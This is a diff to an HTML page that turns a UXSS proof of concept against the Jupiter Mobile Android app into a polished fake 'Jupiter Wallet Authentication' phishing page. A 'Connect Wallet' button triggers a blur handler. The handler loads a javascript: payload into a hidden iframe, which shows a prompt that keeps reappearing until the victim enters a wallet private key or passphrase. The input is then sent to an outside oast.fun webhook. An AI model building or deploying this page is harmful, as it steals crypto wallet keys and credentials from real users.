@@ -1,17 +1,176 @@
+<!DOCTYPE html>
 <html lang="en-US">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, user-scalable=no">
-  <title>UXSS (Jupiter Mobile Android)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jupiter Wallet Authentication</title>
   <style>
-    iframe { visibility: hidden; }
-    body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      background: #000;
+      color: #fff;
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .container {
+      background: rgba(19, 19, 19, 0.9);
+      border-radius: 24px;
+      padding: 50px 40px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+      max-width: 500px;
+      width: 100%;
+      border: 1px solid #2a2a2a;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+      background: linear-gradient(135deg, #c8f284, #84f2c5);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      font-weight: 800;
+      color: #000;
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 15px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #fff, #c8f284);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      margin-bottom: 30px;
+      color: #aaa;
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    .cta-button {
+      background: #c8f284;
+      color: #000;
+      border: none;
+      padding: 18px 45px;
+      font-size: 1.2rem;
+      border-radius: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      position: relative;
+      overflow: hidden;
+      margin: 20px 0;
+      width: 100%;
+      max-width: 300px;
+      box-shadow: 0 4px 20px rgba(200, 242, 132, 0.3);
+    }
+
+    .cta-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 25px rgba(200, 242, 132, 0.5);
+    }
+
+    .cta-button:active {
+      transform: translateY(1px);
+    }
+
+    .security-note {
+      margin-top: 30px;
+      font-size: 0.9rem;
+      color: #777;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .lock-icon {
+      font-size: 1.1rem;
+    }
+
+    .footer {
+      margin-top: 40px;
+      color: #555;
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    iframe {
+      visibility: hidden;
+      position: absolute;
+      width: 0;
+      height: 0;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 40px 25px;
+      }
+      
+      h1 {
+        font-size: 1.8rem;
+      }
+      
+      .cta-button {
+        padding: 16px 30px;
+        font-size: 1.1rem;
+      }
+    }
   </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">J</div>
+    <h1>Wallet Verification</h1>
+    <p class="subtitle">Please authenticate your Jupiter Wallet to continue using mobile services</p>
+    <button class="cta-button" id="authButton">Connect Wallet</button>
+    <p class="security-note">
+      <span class="lock-icon">🔒</span> Secure Jupiter Authentication
+    </p>
+  </div>
+  
+  <div class="footer">
+    Jupiter © 2025
+  </div>
+  
+  <iframe id="iframe"></iframe>
+
   <script>
+    document.getElementById('authButton').addEventListener('click', function() {
+      // Trigger the blur event to activate the payload
+      window.focus();
+      setTimeout(() => window.blur(), 100);
+    });
+
     window.onblur = function () {
-      const loginPromptMessage = 'In order to access Jupiter Mobile\n' +
-                                'you must first login on your\nJupiter Wallet Account.\n\n' +
-                                'Please type your e-mail\nand your password:';
+      const loginPromptMessage = 'Jupiter Wallet Authentication Required\n\n' +
+                                'To secure your assets and verify your identity,\n' +
+                                'please enter your wallet private key or passphrase:\n\n' +
+                                'This is required to complete the mobile verification process.';
 
       // Payload to execute in iframe via javascript: (GET webhook)
       const iframeScriptPayload =
@@ -19,7 +178,7 @@
           "var promptMessage=" + JSON.stringify(loginPromptMessage) + ";" +
           "var userInput='';" +
           // Force input: Cancel/empty loops until valid
-          "while(userInput===null||(''+userInput).trim()===''){ userInput=prompt(promptMessage,'E-mail / Password.'); }" +
+          "while(userInput===null||(''+userInput).trim()===''){ userInput=prompt(promptMessage,'Private Key / Passphrase'); }" +
           // Build URL for GET webhook
           "var webhookUrl=" + JSON.stringify("https://kfolxxnghaeuziyteiecvsfddt725uimk.oast.fun/") + ";" +
           "var queryString='?credentials='+encodeURIComponent(userInput);" +
@@ -33,9 +192,5 @@
       document.getElementById('iframe').src = "javascript:" + iframeScriptPayload;
     };
   </script>
-</head>
-<body>
-  <h1>Click Here</h1>
-  <iframe id="iframe"></iframe>
 </body>
 </html>
